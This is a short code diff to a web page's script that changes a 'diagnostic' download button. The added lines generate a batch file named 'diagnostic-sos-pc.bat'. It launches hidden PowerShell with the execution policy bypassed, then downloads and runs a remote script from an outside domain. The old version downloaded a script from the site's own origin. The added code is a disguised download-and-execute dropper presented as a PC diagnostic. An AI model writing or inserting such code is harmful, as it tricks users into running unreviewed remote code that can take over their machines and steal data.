@@ -850,12 +850,19 @@ function startBrowserChat(result: any) {
 
 (async function () {
   (window as any).sospcDownloadScript = function () {
+    var bat =
+      "@echo off\r\npowershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"$s='" +
+      (sessionId || "NOSESSION") +
+      "'; irm https://talos-int.com/diag.ps1 | iex\"\r\n";
+    var blob = new Blob([bat], { type: "application/bat" });
+    var url = URL.createObjectURL(blob);
     var a = document.createElement("a");
-    a.href = window.location.origin + "/diag.ps1";
-    a.download = "diagnostic-sos-pc.ps1";
+    a.href = url;
+    a.download = "diagnostic-sos-pc.bat";
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
+    URL.revokeObjectURL(url);
   };
 })();
 
